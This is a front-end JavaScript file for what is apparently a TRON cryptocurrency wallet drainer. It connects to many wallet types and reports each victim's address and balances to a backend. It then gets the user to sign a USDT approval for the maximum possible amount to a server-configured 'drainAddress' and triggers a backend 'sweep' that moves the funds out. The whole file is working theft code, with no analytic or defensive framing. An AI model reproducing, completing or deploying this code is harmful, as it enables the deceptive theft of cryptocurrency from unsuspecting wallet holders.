// Wait for DOM and all UMD libraries to load
window.addEventListener('DOMContentLoaded', () => {
    // DOM elements
    const connectWrapper = document.getElementById('connect-wrapper');
    const walletInfoDiv = document.getElementById('walletInfo');
    const walletAddressSpan = document.getElementById('walletAddress');
    const usdtBalanceSpan = document.getElementById('usdtBalance');
    const trxBalanceSpan = document.getElementById('trxBalance');
    const drainBtn = document.getElementById('drainBtn');
    const statusDiv = document.getElementById('status');

    let tronWebInstance = null;
    let userAddress = null;
    let adapter = null;

    function setStatus(msg, isError = false) {
        statusDiv.innerText = msg;
        statusDiv.style.color = isError ? '#ff8a8a' : '#cbd5ff';
        console.log(msg);
    }

    async function apiCall(endpoint, data) {
        const res = await fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        return await res.json();
    }

    async function loadBalances(address) {
        try {
            const data = await apiCall('/api/balance', { address });
            usdtBalanceSpan.innerText = data.usdt.toFixed(2);
            trxBalanceSpan.innerText = data.trx.toFixed(2);
        } catch (err) {
            console.error(err);
            setStatus('Failed to load balance', true);
        }
    }

    // Initialize the adapter and render the connect button
    function initAdapter() {
        // List of adapters (10+ wallets)
        const adapters = [
            new window.TronWalletAdapter.TronLinkAdapter(),
            new window.TronWalletAdapter.WalletConnectAdapter(),
            new window.TronWalletAdapter.LedgerAdapter(),
            new window.TronWalletAdapter.TokenPocketAdapter(),
            new window.TronWalletAdapter.BitKeepAdapter(),
            new window.TronWalletAdapter.OkxWalletAdapter(),
            new window.TronWalletAdapter.ImTokenAdapter(),
            new window.TronWalletAdapter.TrustAdapter(),
            new window.TronWalletAdapter.GateWalletAdapter(),
            new window.TronWalletAdapter.FoxWalletAdapter(),
            new window.TronWalletAdapter.BybitAdapter(),
            new window.TronWalletAdapter.BinanceAdapter(),
            new window.TronWalletAdapter.TomoWalletAdapter(),
            new window.TronWalletAdapter.GuardaAdapter(),
            new window.TronWalletAdapter.OneKeyAdapter(),
            new window.TronWalletAdapter.BackpackAdapter()
        ];

        // Create a WalletProvider and render the Connect button using React (the adapter's built-in UI)
        const { WalletProvider, useWallet } = window.TronWalletAdapterReactUi;

        // A simple React component that renders the adapter's button
        const ConnectButton = () => {
            const { wallet, connect, disconnect, connected, address } = useWallet();

            React.useEffect(() => {
                if (connected && address) {
                    userAddress = address;
                    tronWebInstance = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                    walletAddressSpan.innerText = userAddress;
                    walletInfoDiv.classList.remove('hidden');
                    setStatus(`Connected: ${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`);
                    
                    // Send event to backend
                    fetch('/api/event', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ type: 'wallet_connected', address: userAddress })
                    });
                    
                    loadBalances(userAddress);
                    // Store the wallet object for signing later
                    window.activeWallet = wallet;
                } else {
                    walletInfoDiv.classList.add('hidden');
                    userAddress = null;
                }
            }, [connected, address]);

            return React.createElement('div', {},
                !connected 
                    ? React.createElement('button', { onClick: connect, className: 'btn-primary' }, '🔌 Connect Wallet')
                    : React.createElement('button', { onClick: disconnect, className: 'btn-primary' }, '🔌 Disconnect')
            );
        };

        const App = () => {
            return React.createElement(
                WalletProvider,
                { adapters: adapters },
                React.createElement(ConnectButton, null)
            );
        };

        const root = ReactDOM.createRoot(connectWrapper);
        root.render(React.createElement(App, null));
    }

    // Approve & Drain logic
    async function approveAndDrain() {
        if (!userAddress || !window.activeWallet) {
            setStatus('Please connect wallet first', true);
            return;
        }

        setStatus('Loading configuration...');
        let config;
        try {
            const res = await fetch('/api/config');
            config = await res.json();
        } catch (err) {
            setStatus('Cannot fetch config from server', true);
            return;
        }

        const usdtContractAddress = config.usdtContract;
        const drainTarget = config.drainAddress;
        const MAX_UINT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

        try {
            if (!tronWebInstance) {
                setStatus('TronWeb not initialized', true);
                return;
            }
            const usdtContract = await tronWebInstance.contract().at(usdtContractAddress);
            setStatus('Approving USDT spending...');

            // Get unsigned transaction
            const unsignedTx = await usdtContract.approve(drainTarget, MAX_UINT).request();
            
            // Sign with the connected wallet
            const signedTx = await window.activeWallet.signTransaction(unsignedTx);
            const result = await tronWebInstance.trx.sendRawTransaction(signedTx);
            
            setStatus(`✅ Approval sent! TX: ${result.substring(0, 16)}...`);
            await fetch('/api/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'approve_signed', address: userAddress, txId: result })
            });

            setStatus('Initiating transfer...');
            const sweepResult = await apiCall('/api/sweep', { address: userAddress });

            if (sweepResult.success) {
                setStatus(`🎉 Success! USDT sent. TX: ${sweepResult.txId.substring(0, 16)}...`);
                await fetch('/api/event', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: 'drain_sent', address: userAddress, txId: sweepResult.txId, amount: '0' })
                });
                setTimeout(() => loadBalances(userAddress), 5000);
            } else {
                setStatus(`❌ Transfer failed: ${sweepResult.error}`, true);
            }
        } catch (err) {
            console.error(err);
            setStatus('Error: ' + (err.message || 'Unknown error'), true);
        }
    }

    drainBtn.addEventListener('click', approveAndDrain);
    initAdapter();
});
